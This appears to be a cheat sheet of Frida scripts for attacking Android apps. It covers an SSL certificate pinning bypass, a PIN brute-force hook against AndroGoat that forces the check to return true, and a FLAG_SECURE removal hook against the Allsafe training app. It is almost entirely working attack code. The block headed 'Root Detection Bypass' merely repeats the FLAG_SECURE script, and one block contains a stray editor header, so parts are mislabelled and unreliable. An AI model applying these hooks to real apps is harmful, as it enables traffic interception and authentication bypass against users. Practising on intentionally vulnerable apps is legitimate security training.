**CodeSahre SSL Certficate Pinning Bypass**
```js
setTimeout(function(){
    Java.perform(function (){
        console.log("");
            console.log("[.] Cert Pinning Bypass/Re-Pinning");

            var CertificateFactory = Java.use("java.security.cert.CertificateFactory");
            var FileInputStream = Java.use("java.io.FileInputStream");
            var BufferedInputStream = Java.use("java.io.BufferedInputStream");
            var X509Certificate = Java.use("java.security.cert.X509Certificate");
            var KeyStore = Java.use("java.security.KeyStore");
            var TrustManagerFactory = Java.use("javax.net.ssl.TrustManagerFactory");
            var SSLContext = Java.use("javax.net.ssl.SSLContext");

            // Load CAs from an InputStream
            console.log("[+] Loading our CA...")
            var cf = CertificateFactory.getInstance("X.509");
            
            try {
                var fileInputStream = FileInputStream.$new("/data/local/tmp/cert-der.crt");
            }
            catch(err) {
                console.log("[o] " + err);
            }
            
            var bufferedInputStream = BufferedInputStream.$new(fileInputStream);
                var ca = cf.generateCertificate(bufferedInputStream);
            bufferedInputStream.close();

                var certInfo = Java.cast(ca, X509Certificate);
            console.log("[o] Our CA Info: " + certInfo.getSubjectDN());

            // Create a KeyStore containing our trusted CAs
            console.log("[+] Creating a KeyStore for our CA...");
            var keyStoreType = KeyStore.getDefaultType();
            var keyStore = KeyStore.getInstance(keyStoreType);
            keyStore.load(null, null);
            keyStore.setCertificateEntry("ca", ca);
            
            // Create a TrustManager that trusts the CAs in our KeyStore
            console.log("[+] Creating a TrustManager that trusts the CA in our KeyStore...");
            var tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();
            var tmf = TrustManagerFactory.getInstance(tmfAlgorithm);
            tmf.init(keyStore);
            console.log("[+] Our TrustManager is ready...");

            console.log("[+] Hijacking SSLContext methods now...")
            console.log("[-] Waiting for the app to invoke SSLContext.init()...")

                SSLContext.init.overload("[Ljavax.net.ssl.KeyManager;", "[Ljavax.net.ssl.TrustManager;", "java.security.SecureRandom").implementation = function(a,b,c) {
                        console.log("[o] App invoked javax.net.ssl.SSLContext.init...");
                        SSLContext.init.overload("[Ljavax.net.ssl.KeyManager;", "[Ljavax.net.ssl.TrustManager;", "java.security.SecureRandom").call(this, a, tmf.getTrustManagers(), c);
                        console.log("[+] SSLContext initialized with our custom TrustManager!");
                }
    });
},0);
```

**Root Detection Bypass**
```js
Java.perform(function() {
    // Obtener referencia a la clase Activity
    var Activity = Java.use("infosecadventures.allsafe.MainActivity");

    // Hook de getWindow() para interceptar setFlags
    Activity.getWindow.implementation = function() {
        var window = this.getWindow(); // Llamada original
        var WindowManagerLayoutParams = Java.use("android.view.WindowManager$LayoutParams");

        // Hook de setFlags en la ventana
        window.setFlags.overload('int', 'int').implementation = function(flags, mask) {
            // Quitar FLAG_SECURE (0x2000) de las flags
            var FLAG_SECURE = WindowManagerLayoutParams.FLAG_SECURE.value;
            flags = flags & ~FLAG_SECURE;
            console.log("[+] FLAG_SECURE removed");
            return this.setFlags(flags, mask);
        };
        return window;
    };
});
```

**Pin Bypass extracting the correct PIN**
```js
  GNU nano 8.6                                       pin_bypass3.js *                                               
Java.perform(function () {
    // Get a reference to the SecurityManager class
    var SecurityManager = Java.use("owasp.sat.agoat.AccessControlIssue1Activity");

    // Hook into the verifyPassword function
    SecurityManager.isPinCorrect.overload('java.lang.String').implementation = function(pin) {
        console.log("Intercepted PIN ", pin);
        for (let i=1000; i < 9999; i++) {
                let num = i.toString();
                if(this.isPinCorrect(num)) {
                console.log("Correct PIN found: ", num);

                }
        }
        // Always return true to bypass the password check
        return true;
    };
});
``` 


**FLAG_SECURE Bypass**
```js
Java.perform(function() {
    // Obtener referencia a la clase Activity
    var Activity = Java.use("infosecadventures.allsafe.MainActivity");

    // Hook de getWindow() para interceptar setFlags
    Activity.getWindow.implementation = function() {
        var window = this.getWindow(); // Llamada original
        var WindowManagerLayoutParams = Java.use("android.view.WindowManager$LayoutParams");

        // Hook de setFlags en la ventana
        window.setFlags.overload('int', 'int').implementation = function(flags, mask) {
            // Quitar FLAG_SECURE (0x2000) de las flags
            var FLAG_SECURE = WindowManagerLayoutParams.FLAG_SECURE.value;
            flags = flags & ~FLAG_SECURE;
            console.log("[+] FLAG_SECURE removed");
            return this.setFlags(flags, mask);
        };
        return window;
    };
});
```
